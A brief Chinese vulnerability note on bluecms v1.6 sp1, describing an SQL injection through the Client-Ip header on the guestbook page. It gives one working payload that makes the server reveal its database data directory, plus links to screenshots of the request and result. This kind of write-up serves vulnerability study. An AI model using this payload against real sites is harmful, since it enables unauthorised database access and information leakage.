## 关于 bluecms 漏洞整理



### xff 注入


在bluecms v1.6 sp1 版本中在留言页面，通过在头部注入：`Client-Ip: 127.0.0.3',@@datadir)#`

如下图：

[![rer2e1.png](https://s3.ax1x.com/2020/12/13/rer2e1.png)](https://imgchr.com/i/rer2e1)



注入之后的结果如下：

[![rer4JO.png](https://s3.ax1x.com/2020/12/13/rer4JO.png)](https://imgchr.com/i/rer4JO)







